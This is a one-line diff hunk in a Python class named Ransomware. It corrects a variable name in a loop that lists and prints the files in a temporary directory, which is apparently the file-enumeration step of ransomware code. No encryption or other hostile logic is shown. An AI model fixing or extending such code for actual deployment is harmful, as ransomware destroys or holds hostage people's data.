@@ -76,7 +76,7 @@ class Ransomware:
         for f in os.listdir(tmp_dir):   
 
             if os.path.isfile(os.path.join(tmp_dir, f)):
-                abs_file_path = os.path.join(tmp, f)
+                abs_file_path = os.path.join(tmp_dir, f)
                 print(abs_file_path)
 
                 
